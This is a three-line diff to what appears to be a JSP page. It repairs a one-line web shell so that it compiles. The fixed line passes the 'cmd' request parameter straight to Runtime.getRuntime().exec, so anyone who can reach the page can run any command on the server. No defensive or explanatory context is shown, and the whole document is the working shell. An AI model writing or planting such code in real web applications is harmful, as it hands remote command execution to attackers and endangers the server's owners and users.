@@ -1,3 +1,3 @@
 <% 
-Runtime.getruntime().exec(request.getParameter("cmd")) 
+Runtime.getRuntime().exec(request.getParameter("cmd"));
 %>
